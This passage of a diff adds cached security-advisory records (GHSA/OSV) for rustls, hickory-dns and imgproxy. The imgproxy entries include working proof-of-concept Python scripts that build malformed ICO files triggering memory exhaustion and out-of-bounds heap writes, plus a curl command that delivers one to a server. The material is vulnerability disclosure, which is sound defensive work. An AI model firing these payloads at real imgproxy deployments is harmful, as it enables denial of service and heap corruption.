authentication succeed after ECH rejection, the client \"MUST ... abort the connection with an \"ech_required\" alert **before sending any application data to the server.**\"\r\n- Section 6.1.7: the certificate is checked only against `public_name`, and the connection \"MUST NOT\" be reported as successful to the application. rustls does report failure correctly. The problem is only that data is sent before the alert.\r\n\r\nThis affects only clients that meet all of these conditions:\r\n\r\n- They use `EchMode::Enable`. GREASE ECH is not affected.\r\n- They write application data before the handshake completes.\r\n- They connect to a server that rejects their ECH config, for example because the config is stale. This is the same case where the server returns retry configs.\r\n\r\nThe usual client response to rejection is to retry with the server's retry configs. In that case, the data has already gone to the outer server.\r\n",
+          "published_at": "2026-10-14T09:55:10Z",
+          "updated_at": "2026-10-14T09:55:10Z",
+          "withdrawn_at": null,
+          "severity": "low",
+          "cvss": {
+            "vector_string": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N",
+            "score": 2.3
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N",
+              "score": 2.3
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "rust",
+                "name": "rustls"
+              },
+              "vulnerable_version_range": "0.23.44,0.23.45",
+              "patched_versions": "",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-vp88-798v-h67f",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "updated_existing",
+      "addedAliases": [
+        "CVE-2026-123612"
+      ]
+    },
+    {
+      "id": "GHSA-6f2x-v7q7-m7m5",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-6f2x-v7q7-m7m5",
+      "checkedAt": "2026-11-08T21:08:21.960603Z",
+      "sha256": "c8daffc260aedf0b071a3f622278972a7cd012b460c1a0aa43740507d7eeb0e8",
+      "maintainerVerification": {
+        "id": "GHSA-6f2x-v7q7-m7m5",
+        "osvModifiedAt": "2026-11-08T10:56:17.173884253Z",
+        "aliases": [
+          "CVE-2026-123585"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/hickory-dns/hickory-dns/security-advisories/GHSA-6f2x-v7q7-m7m5",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:07:04.807357Z",
+        "sha256": "59d73c15024d00074d8ea3f61efc4a1c37d1c0c2a1f0f9b2ffabe6e41e04971a",
+        "maintainer": {
+          "ghsa_id": "GHSA-6f2x-v7q7-m7m5",
+          "cve_id": null,
+          "summary": "Resolver follows irrelevant CNAME records",
+          "description": "When the Hickory DNS resolver follows CNAME records, it sends queries that are not necessary to answer the original recursive query. If there are any CNAME records in the authority section or additional section of the response, queries will be sent for those names. If there are any CNAME records that are not part of a CNAME chain starting from the original recursive query name, queries will be sent for those names. This increases query amplification beyond what is necessary to answer the recursive query.",
+          "published_at": "2026-09-03T21:52:25Z",
+          "updated_at": "2026-09-03T21:52:25Z",
+          "withdrawn_at": null,
+          "severity": "low",
+          "cvss": {
+            "vector_string": null,
+            "score": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": null,
+              "score": null
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "rust",
+                "name": "hickory-resolver"
+              },
+              "vulnerable_version_range": "v0.25.0 .. v0.26.1",
+              "patched_versions": "0.26.2",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-6f2x-v7q7-m7m5",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "created_overlay",
+      "addedAliases": []
+    },
+    {
+      "id": "GHSA-q2qq-hmj6-3wpp",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-q2qq-hmj6-3wpp",
+      "checkedAt": "2026-11-08T21:08:21.932580Z",
+      "sha256": "ac933677a1669bf3bb283dbb246e31a1449f2257e56d4695151ed6715f44e162",
+      "maintainerVerification": {
+        "id": "GHSA-q2qq-hmj6-3wpp",
+        "osvModifiedAt": "2026-11-08T10:56:05.969001606Z",
+        "aliases": [
+          "CVE-2026-123608",
+          "RUSTSEC-2026-0119"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/hickory-dns/hickory-dns/security-advisories/GHSA-q2qq-hmj6-3wpp",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:07:04.725655Z",
+        "sha256": "6bab5a2d17987f6d01339b8bca10dd0d5ebac1358663171bf508d6960d0ded4a",
+        "maintainer": {
+          "ghsa_id": "GHSA-q2qq-hmj6-3wpp",
+          "cve_id": null,
+          "summary": "CPU exhaustion during message encoding due to O(n²) name compression",
+          "description": "During message encoding, `hickory-proto`'s `BinEncoder` stores pointers to labels that are candidates for name compression in a `Vec<(usize, Vec<u8>)>`. The name compression logic then searches for matches with a linear scan.\r\n\r\nA malicious message with many records can both introduce many candidate labels, and invoke this linear scan many times. This can amplify CPU exhaustion in DoS attacks.\r\n\r\nThis is similar to [CVE-2024-8508](https://www.nlnetlabs.nl/downloads/unbound/CVE-2024-8508.txt).\r\n\r\n### Reporter\r\n\r\nQifan Zhang, Palo Alto Networks",
+          "published_at": "2026-05-01T14:00:55Z",
+          "updated_at": "2026-05-01T14:00:55Z",
+          "withdrawn_at": null,
+          "severity": "medium",
+          "cvss": {
+            "vector_string": null,
+            "score": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": null,
+              "score": null
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "rust",
+                "name": "hickory-proto"
+              },
+              "vulnerable_version_range": "hickory-proto 0.3.1 .. 0.26.0",
+              "patched_versions": "0.26.1",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-q2qq-hmj6-3wpp",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "created_overlay",
+      "addedAliases": []
+    },
+    {
+      "id": "GHSA-2mjx-qc3c-rqvc",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-2mjx-qc3c-rqvc",
+      "checkedAt": "2026-11-08T21:08:26.164850Z",
+      "sha256": "d09b233d055e5bc5a7fb4ab4bcb31b3c70d2d33c98ea2c515961b6b6a8b7c79c",
+      "maintainerVerification": {
+        "id": "GHSA-2mjx-qc3c-rqvc",
+        "osvModifiedAt": "2026-11-08T10:55:54.395419388Z",
+        "aliases": [
+          "CVE-2026-123613",
+          "RUSTSEC-2026-0285"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/rustls/rustls/security-advisories/GHSA-2mjx-qc3c-rqvc",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:07:04.762462Z",
+        "sha256": "1eeb2d858d145827682bd7def301d726acd85c0c46db1cac9bb8296cdb3d8928",
+        "maintainer": {
+          "ghsa_id": "GHSA-2mjx-qc3c-rqvc",
+          "cve_id": null,
+          "summary": "TLS 1.3 handshake messages incorrectly accepted across encryption level boundaries",
+          "description": "Rustls accepted TLS 1.3 handshake messages sent at the wrong encryption level when they followed a key-changing message in the same record. The handshake transcript is still authenticated, so a network-position attacker cannot use this to alter or complete a handshake; the practical effect is that a peer could send handshake messages that should be encrypted in plaintext without rustls rejecting the connection.\r\n\r\nThis issue affects rustls versions 0.23.13 through 0.23.44 inclusive.\r\n\r\n# Original report\r\n### Summary\r\nRustls (tested version 0.23.44, and it appears still an issue on latest master though I have not tested this) accepts a TLS 1.3 server flight where a plaintext EncryptedExtensions is packed into the same record as the ServerHello.\r\n\r\nThis is very similar to Go's CVE-2025-61730 fixed in https://github.com/golang/go/commit/5046bdf8a612b35a2c1a9e168054c1d5c65e7dd7\r\n\r\n### Details\r\nIt appears `Deframer::aligned` considers itself aligned as long as all messages remaining in the buffer are complete. Rustls processes the ServerHello, installs the handshake keys, then pulls the complete (plaintext) EncryptedExtensions out of the buffer.\r\n\r\nThis is insufficient per RFC 8446 section 5.1's\r\n\r\n> Handshake messages MUST NOT span key changes.  Implementations MUST verify that all messages immediately preceding a key change align with a record boundary; if not, then they MUST terminate the connection with an \"unexpected_message\" alert.  Because the ClientHello, EndOfEarlyData, ServerHello, Finished, and KeyUpdate messages can immediately precede a key change, implementations MUST send these messages in alignment with a record boundary.\r\n\r\n### Impact\r\nAn on path attacker can inject plaintext messages that are accepted.\r\n\r\n### Tool Use Disclosure\r\nThis was discovered by a new TLS/DTLS test suite currently under construction. The specific testcase was inspired by the Go CVE. Other tested implementations (Botan, OpenSSL, BoringSSL, Go, wolfSSL) reject this protocol flow. Daybreak Blue reviewed the rustls code to identify probable root cause.",
+          "published_at": "2026-09-14T15:12:15Z",
+          "updated_at": "2026-09-14T15:12:15Z",
+          "withdrawn_at": null,
+          "severity": "medium",
+          "cvss": {
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+            "score": 5.3
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+              "score": 5.3
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "rust",
+                "name": "rustls"
+              },
+              "vulnerable_version_range": ">=0.23.13, <= 0.23.44",
+              "patched_versions": "0.23.45",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-2mjx-qc3c-rqvc",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "updated_existing",
+      "addedAliases": [
+        "CVE-2026-123613",
+        "RUSTSEC-2026-0285"
+      ]
+    },
+    {
+      "id": "GHSA-3v94-mw7p-v465",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-3v94-mw7p-v465",
+      "checkedAt": "2026-11-08T21:08:26.120316Z",
+      "sha256": "98f11d52185ef325a80348719372847e5c6c5f0444cc39a7f0c9ee626db88c26",
+      "maintainerVerification": {
+        "id": "GHSA-3v94-mw7p-v465",
+        "osvModifiedAt": "2026-11-08T10:55:55.393700581Z",
+        "aliases": [
+          "CVE-2026-123607",
+          "RUSTSEC-2026-0118",
+          "RUSTSEC-2026-0120"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/hickory-dns/hickory-dns/security-advisories/GHSA-3v94-mw7p-v465",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:07:09.032379Z",
+        "sha256": "b6389479a7ad3bd2c4b0e29ab6f85ae4d56ec4af99a7e36ed6898135b9f507ed",
+        "maintainer": {
+          "ghsa_id": "GHSA-3v94-mw7p-v465",
+          "cve_id": null,
+          "summary": "NSEC3 closest-encloser proof validation enters unbounded loop on cross-zone responses",
+          "description": "The NSEC3 closest-encloser proof validation in `hickory-proto`'s (0.25.0-alpha.3 ... 0.25.2) and `hickory-net`'s (0.26.0-alpha.1 .. 0.26.0)  `DnssecDnsHandle` walks from the QNAME up to the SOA owner name, building a list of candidate encloser names. The iterator used assumes the QNAME is a descendant of the SOA owner, terminating only when the current candidate equals the SOA name. When the SOA in a response's authority section is not an ancestor of the QNAME, the loop stalls at the DNS root and never terminates, repeatedly calling `Name::base_name()` and pushing newly allocated `Name` and hashed-name entries into the candidate `Vec`.\r\n\r\nThe bug is reachable by any caller of `DnssecDnsHandle`, including the resolver, recursor, and client, when built with the `dnssec-ring` or `dnssec-aws-lc-rs` feature and configured to perform DNSSEC validation. It is triggered while validating a NoData or NXDomain response whose authority section contains an SOA record from a zone other than an ancestor of the QNAME, on a code path that requires NSEC3 closest-encloser proof. In practice this can be reached through an insecure CNAME chain that crosses zone boundaries into a DNSSEC-signed zone returning NoData, but the minimum condition is just a mismatched SOA owner on a response requiring NSEC3 validation.\r\n\r\nA `debug_assert_ne!(name, Name::root())` guards the loop body, so debug builds abort with a panic on the first iteration past the root. Release builds compile the assertion out and run the loop unbounded, allocating until the process exhausts available memory. A reachable upstream attacker who can return such a response can therefore crash a debug build or exhaust memory on a release build, for the affected configurations.\r\n\r\nThe affected code was migrated from `hickory-proto` to `hickory-net` as part of the 0.26.0 release. We recommend all affected users update to `hickory-net` 0.26.1 for the fix.\r\n\r\n### Reporter\r\n\r\nDavid Cook, ISRG",
+          "published_at": "2026-05-01T13:58:47Z",
+          "updated_at": "2026-05-01T13:58:47Z",
+          "withdrawn_at": null,
+          "severity": "high",
+          "cvss": {
+            "vector_string": null,
+            "score": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": null,
+              "score": null
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "rust",
+                "name": "hickory-proto"
+              },
+              "vulnerable_version_range": "0.25.0-alpha.3 ... 0.25.2",
+              "patched_versions": "",
+              "vulnerable_functions": []
+            },
+            {
+              "package": {
+                "ecosystem": "rust",
+                "name": "hickory-net"
+              },
+              "vulnerable_version_range": "0.26.0-alpha.1 .. 0.26.0",
+              "patched_versions": "0.26.1",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-3v94-mw7p-v465",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "created_overlay",
+      "addedAliases": []
+    },
+    {
+      "id": "GHSA-c8m5-c952-6cm4",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-c8m5-c952-6cm4",
+      "checkedAt": "2026-11-08T21:08:26.160980Z",
+      "sha256": "2f21169e21a955e132d623e440f3d6cb96124199f12766b17b55532d1b067b06",
+      "maintainerVerification": {
+        "id": "GHSA-c8m5-c952-6cm4",
+        "osvModifiedAt": "2026-11-08T10:55:36.514447652Z",
+        "aliases": [
+          "CVE-2026-123609",
+          "RUSTSEC-2026-0346"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/rustls/rustls/security-advisories/GHSA-c8m5-c952-6cm4",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:07:08.961170Z",
+        "sha256": "c151a3326d4a7e9602960f9fdb0b248341179203d012666ebd5feac2085f614a",
+        "maintainer": {
+          "ghsa_id": "GHSA-c8m5-c952-6cm4",
+          "cve_id": null,
+          "summary": "Session Debug formatting exposes TLS master secrets and resumption PSKs",
+          "description": "### Summary\r\n\r\nFormatting a client session value with Debug exposes its TLS 1.2 master secret or TLS 1.3 resumption PSK. A custom session store that logs these values can disclose keys to readers of the logs. Ordinary connection and built-in cache diagnostics remain redacted, and the session-store interface already warns that its values are sensitive.\r\n\r\n### Details\r\n\r\nDerived formatters traverse the session's secret-bearing fields. This conflicts with the project's explicit [key-material redaction policy](https://github.com/rustls/rustls/blob/99f2358cae2954837dbb866faf6727de75489ab9/SECURITY.md#boundary-public-api).\r\n\r\n### Proof of concept\r\n\r\nCustom `ClientSessionStore` implementations could leak secret data by using the provided `Tls12ClientSessionValue` or `Tls13ClientSessionValue` in a way that triggers its implementation of the `Debug` trait.\r\n\r\n### Impact\r\n\r\nSuch store implementations could leak the master secret for the TLS connection.\r\n\r\n### Acknowlegement\r\nThanks to OpenAI [OutboundDisclosures@openai.com](mailto:OutboundDisclosures@openai.com) for the disclosure.",
+          "published_at": "2026-10-14T09:54:58Z",
+          "updated_at": "2026-10-14T09:54:58Z",
+          "withdrawn_at": null,
+          "severity": "medium",
+          "cvss": {
+            "vector_string": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:N/A:N",
+            "score": 4.0
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:N/A:N",
+              "score": 4.0
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "rust",
+                "name": "rustls"
+              },
+              "vulnerable_version_range": "< 0.23.46, > 0.24.0-dev.1",
+              "patched_versions": ">= 0.23.46, >= 0.24.0-dev.2",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-c8m5-c952-6cm4",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "updated_existing",
+      "addedAliases": [
+        "CVE-2026-123609"
+      ]
+    },
+    {
+      "id": "GHSA-mmq5-xm89-9pfg",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-mmq5-xm89-9pfg",
+      "checkedAt": "2026-11-08T21:08:26.160637Z",
+      "sha256": "31c42e6408304226c0399a3d2bca1fef4dbae5ccc4c5d53a128e581025c5d9b8",
+      "maintainerVerification": {
+        "id": "GHSA-mmq5-xm89-9pfg",
+        "osvModifiedAt": "2026-11-08T10:56:06.969623324Z",
+        "aliases": [
+          "CVE-2026-123616",
+          "GO-2026-6898"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/imgproxy/imgproxy/security-advisories/GHSA-mmq5-xm89-9pfg",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:07:08.948439Z",
+        "sha256": "773103118e251e6e47b3e7397a4cc935e898adceb4f6f91911777c8711ce91ae",
+        "maintainer": {
+          "ghsa_id": "GHSA-mmq5-xm89-9pfg",
+          "cve_id": null,
+          "summary": "Unbounded memory allocation in ICO loader allows unauthenticated memory-exhaustion DoS via crafted data_size field",
+          "description": "### Summary\r\n\r\nUnbounded and unvalidated memory allocation in imgproxy's ICO loader (`vips/icoload.c`). An attacker-controlled `data_size` field (u32) from the ICO directory entry is passed directly to `VIPS_MALLOC` without any bounds check, so a single crafted 23-byte ICO file makes an imgproxy worker attempt a ~4GB allocation. Present in the latest release (v4.0.15) and the 3.3.x series; confirmed on a live production deployment of imgproxy v4.0.15.\r\n\r\n### Details\r\n\r\nIn `vips_foreign_load_ico_header` in `vips/icoload.c`, the selected directory entry's `data_size` is read and used directly for the allocation:\r\n\r\n```\r\nuint32_t data_size = GUINT32_FROM_LE(largest_image_header.data_size);\r\n\r\n// BMP file explicitly excludes BITMAPFILEHEADER, so we need to add it manually.\r\nVipsPel *data = (VipsPel *) VIPS_MALLOC(NULL, data_size + BMP_FILE_HEADER_LEN);\r\n```\r\n\r\nThere is no validation that `data_size` is sane nor any check that the file actually contains `data_size` bytes at the declared `data_offset`. A crafted 23-byte ICO whose directory entry declares `data_size = 0xfa000068` (~4GB) drives `VIPS_MALLOC(NULL, ~4GB + 14)`.\r\n\r\n### PoC\r\n\r\n```py\r\n# make_ico_4gb.py — generates the exact 23-byte unbounded-allocation trigger.\r\n# Byte-identical to the checksummed, production-verified file:\r\n#   ico-4gb.ico  sha256 6cee1fbfdc69fd4f507e86835ce2fa54519e55608f1dd69f42860f9961b1045b\r\nimport struct, hashlib\r\n\r\nhdr = struct.pack('<HHH', 0, 1, 1)  # reserved, type=ICO, count=1\r\nentry = struct.pack('<BBBBHHII', 16, 16, 0, 0, 1, 32, 0xfa000068, 0x16)\r\ndata = b'\\x00'\r\nblob = hdr + entry + data\r\nassert hashlib.sha256(blob).hexdigest() == \\\r\n    '6cee1fbfdc69fd4f507e86835ce2fa54519e55608f1dd69f42860f9961b1045b'\r\nopen('ico-4gb.ico', 'wb').write(blob)\r\nprint(f\"ico-4gb.ico: {len(blob)} bytes [VERIFIED]\")\r\n```\r\n\r\n```\r\n# imgproxy v4.0.15 with local file sources enabled:\r\n#   IMGPROXY_ENABLE_LOCAL_FILES=true IMGPROXY_LOCAL_FILESYSTEM_ROOT=/ imgproxy\r\ncurl \"http://127.0.0.1:8080/insecure/plain/local:///path/to/ico-4gb.ico@png\"\r\n# → outcome depends on host memory: on a memory-constrained pod the worker\r\n#   OOM-dies; on a larger host the ~4GB allocation succeeds transiently and\r\n#   decode fails -> HTTP 500 (worker survives, but each request burns ~4GB\r\n#   transiently — repeatable memory exhaustion).\r\n```\r\n\r\n### Impact\r\n\r\nUnauthenticated network DoS / memory-exhaustion: on memory-constrained workers, a crash per crafted request. On larger hosts, ~4GB transient allocation per request (sustained firing exhausts memory or the allocation budget). Any imgproxy deployment that processes attacker-supplied images.\r\n",
+          "published_at": "2026-10-06T15:28:16Z",
+          "updated_at": "2026-10-06T15:28:16Z",
+          "withdrawn_at": null,
+          "severity": "high",
+          "cvss": {
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+            "score": 7.5
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "score": 7.5
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "",
+                "name": "github.com/darthsim/imgproxy"
+              },
+              "vulnerable_version_range": ">= 3.3.0, <= 4.0.15",
+              "patched_versions": ">= 4.0.16",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-mmq5-xm89-9pfg",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "updated_existing",
+      "addedAliases": [
+        "CVE-2026-123616",
+        "GO-2026-6898"
+      ]
+    },
+    {
+      "id": "GHSA-hff9-5pqw-6w9f",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-hff9-5pqw-6w9f",
+      "checkedAt": "2026-11-08T21:08:26.164540Z",
+      "sha256": "d35242c90f17f8bd3896c455b3b94299eb80773a015afac817b0d5a8aa1eaf7a",
+      "maintainerVerification": {
+        "id": "GHSA-hff9-5pqw-6w9f",
+        "osvModifiedAt": "2026-11-08T10:56:03.570793708Z",
+        "aliases": [
+          "CVE-2026-123614",
+          "GO-2026-6897"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/imgproxy/imgproxy/security-advisories/GHSA-hff9-5pqw-6w9f",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:07:08.981227Z",
+        "sha256": "bb3a9f9f37da82a540073fe4a906d6a4773df3325f72843c2184fc87c1ab3008",
+        "maintainer": {
+          "ghsa_id": "GHSA-hff9-5pqw-6w9f",
+          "cve_id": null,
+          "summary": "Integer overflow in ICO loader causes remote denial of service and permits remote code execution via heap buffer overflow",
+          "description": "## Summary\r\n\r\nThe ICO loader allocates `data_size + BMP_FILE_HEADER_LEN` bytes after reading a 32-bit attacker-controlled `data_size`. For `data_size > UINT32_MAX - BMP_FILE_HEADER_LEN`, the addition wraps before allocation. imgproxy then writes the ICO prefix and reads up to the original declared size starting 14 bytes into the undersized allocation. A network client can turn this heap overflow into remote denial of service or remote code execution.\r\n\r\n## Technical details\r\n\r\nThe vulnerable path is in [`vips/icoload.c` at commit `f4fedbb`](https://github.com/imgproxy/imgproxy/blob/f4fedbb5c7f6684e7a8e0a9bb7e666773f3c40c0/vips/icoload.c#L154-L164):\r\n\r\n```c\r\nuint32_t data_size = GUINT32_FROM_LE(largest_image_header.data_size);\r\n\r\nVipsPel *data = (VipsPel *) VIPS_MALLOC(NULL, data_size + BMP_FILE_HEADER_LEN);\r\nvoid *actual_data = data + BMP_FILE_HEADER_LEN;\r\n\r\nif (vips_foreign_load_read_full(ico->source, actual_data, data_size) <= 0) {\r\n  vips_error(\"vips_foreign_load_ico_header\", \"unable to read ICO image data from the source\");\r\n  return -1;\r\n}\r\n```\r\n\r\nThe crafted directory entry contains:\r\n\r\n```text\r\ndata_size       = 0xfffffff5 (4294967285)\r\ndata_offset     = 22\r\nBMP header size = 14\r\n32-bit result   = (0xfffffff5 + 14) mod 2^32 = 3\r\n```\r\n\r\nThe allocation is therefore three bytes. `actual_data` points 14 bytes after the allocation base. The fixture contains 64 bytes after the ICO header, so the source callback copies those 64 bytes to an invalid destination before it can report that the declared multi-gigabyte payload is incomplete.\r\n\r\nThe complete source-to-sink path is:\r\n\r\n1. Attacker-controlled bytes begin with the ICO magic `00 00 01 00`.\r\n2. imgproxy identifies the source as ICO and dispatches it to `vips_icoload_source_go`.\r\n3. `vips_foreign_load_ico_header` reads the attacker-controlled `data_size`.\r\n4. The 32-bit addition wraps, and `VIPS_MALLOC` receives the value three.\r\n5. `vips_foreign_load_read_full` passes the original `data_size` to the Go source callback.\r\n6. The callback writes the available source bytes through the invalid pointer, corrupting the process heap.\r\n\r\n## Impact\r\n\r\nA crafted image can terminate the imgproxy process handling it or potentially lead to remote code execution due to heap corruption.\r\n",
+          "published_at": "2026-10-06T15:30:41Z",
+          "updated_at": "2026-10-06T15:30:41Z",
+          "withdrawn_at": null,
+          "severity": "critical",
+          "cvss": {
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+            "score": 9.8
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+              "score": 9.8
+            },
+            "cvss_v4": {
+              "vector_string": null,
+              "score": null
+            }
+          },
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "go",
+                "name": "github.com/imgproxy/imgproxy/v4"
+              },
+              "vulnerable_version_range": ">= 4.0.0, <= 4.0.15",
+              "patched_versions": ">= 4.0.16",
+              "vulnerable_functions": []
+            }
+          ],
+          "identifiers": [
+            {
+              "value": "GHSA-hff9-5pqw-6w9f",
+              "type": "GHSA"
+            }
+          ],
+          "references": null
+        }
+      },
+      "status": "updated_existing",
+      "addedAliases": [
+        "CVE-2026-123614",
+        "GO-2026-6897"
+      ]
+    },
+    {
+      "id": "GHSA-494m-4556-wf5p",
+      "osvUrl": "https://api.osv.dev/v1/vulns/GHSA-494m-4556-wf5p",
+      "checkedAt": "2026-11-08T21:08:30.548921Z",
+      "sha256": "a67751de4710264441246500ff18e4fc85eda6d1612c8813dbdbbc9ebb0307f6",
+      "maintainerVerification": {
+        "id": "GHSA-494m-4556-wf5p",
+        "osvModifiedAt": "2026-11-08T10:55:46.197261202Z",
+        "aliases": [
+          "CVE-2026-123615",
+          "GO-2026-6895"
+        ],
+        "maintainerUrl": "https://api.github.com/repos/imgproxy/imgproxy/security-advisories/GHSA-494m-4556-wf5p",
+        "status": "verified",
+        "checkedAt": "2026-11-08T21:07:13.405020Z",
+        "sha256": "8f7285acb7676f496114bef954d5fe662013b8b8b4257cc3a637ddb1265f2658",
+        "maintainer": {
+          "ghsa_id": "GHSA-494m-4556-wf5p",
+          "cve_id": null,
+          "summary": "Out-of-bounds heap read/write in ICO loader BMP header reconstruction allows unauthenticated remote worker crash",
+          "description": "### Summary\r\n\r\nOut-of-bounds heap write in imgproxy's ICO loader (`vips/icoload.c`): when the ICO entry's image data buffer is small, the loader's BMP-header-reconstruction writes land past the allocation, corrupting the size field of the following heap chunk. The worker then aborts deterministically (glibc `munmap_chunk(): invalid pointer` → SIGABRT → Go panic, exit code 2). \r\n\r\n### Details\r\n\r\nIn `vips_foreign_load_ico_header` in `vips/icoload.c`, after the ICO entry's image data is read into a heap buffer of `data_size + 14` bytes, the loader reconstructs a BMP file header in front of it using fields read from the ICO's internal BITMAPINFOHEADER:\r\n\r\n```\r\nuint32_t num_colors = GUINT32_FROM_LE(*(uint32_t *) (actual_data + 32));  // unvalidated\r\nuint16_t bpp        = GUINT16_FROM_LE(*(uint16_t *) (actual_data + 14));  // unvalidated\r\n```\r\n\r\n```\r\nif ((num_colors == 0) && (bpp <= 8))\r\n  pix_offset = BMP_FILE_HEADER_LEN + BMP_BITMAP_INFO_HEADER_LEN + 4 * (1 << bpp);\r\nelse\r\n  pix_offset = BMP_FILE_HEADER_LEN + BMP_BITMAP_INFO_HEADER_LEN + 4 * num_colors;\r\n```\r\n\r\n```\r\nint32_t height = GINT32_FROM_LE(*(int32_t *) (actual_data + 8));  // readable past the buffer\r\nheight = height / 2;\r\n```\r\n\r\nWith a crafted entry declaring a tiny `data_size` (e.g. 1 byte), all of these reads (offsets +8, +14, +32) go past the allocation, and the reconstructed-header writes land past the end of the buffer — specifically a 32-bit `height/2`-derived value at `alloc+22..+25`, overwriting the LSBs of the size field of the physically following heap chunk. The corrupted size is always `original_size >> 1` and, in cgo thread arenas, the `NON_MAIN_ARENA` bit lands in the `IS_MMAPPED` position of the corrupted word such that the next `free()` of the victim deterministically takes glibc's `munmap_chunk()` abort path, killing the worker. Depending on heap state, the worker returns 500 for the triggering request and aborts on the corrupted chunk's free; in observed production geometry it dies on the same request (exit code 2).\r\n\r\n\r\n### PoC\r\n\r\n```py\r\n# make_ico_oob.py — generates the exact 23-byte OOB-write trigger.\r\n# Byte-identical to the checksummed, production-verified file:\r\n#   ico-oob.ico  sha256 075f3b5e97242573d32a1b7612672a438b3b24c8fa718e3967305bd65e6151e1\r\nimport struct, hashlib\r\n\r\nhdr = struct.pack('<HHH', 0, 1, 1)  # reserved, type=ICO, count=1\r\n# 16x16, 0 colors, 0 reserved, 1 plane, 32 bpp, data_size=1, data_offset=0x16.\r\n# The tiny data_size (1) makes the loader's BMPINFOHEADER field reads\r\n# (data+8/+14/+32) and header-reconstruction writes go past the 1+14=15-byte\r\n# allocation.\r\nentry = struct.pack('<BBBBHHII', 16, 16, 0, 0, 1, 32, 1, 0x16)\r\ndata = b'\\xAA'  # the single declared image byte\r\nblob = hdr + entry + data\r\nassert hashlib.sha256(blob).hexdigest() == \\\r\n    '075f3b5e97242573d32a1b7612672a438b3b24c8fa718e3967305bd65e6151e1'\r\nopen('ico-oob.ico', 'wb').write(blob)\r\nprint(f\"ico-oob.ico: {len(blob)} bytes [VERIFIED]\")\r\n```\r\n\r\n```\r\n# imgproxy 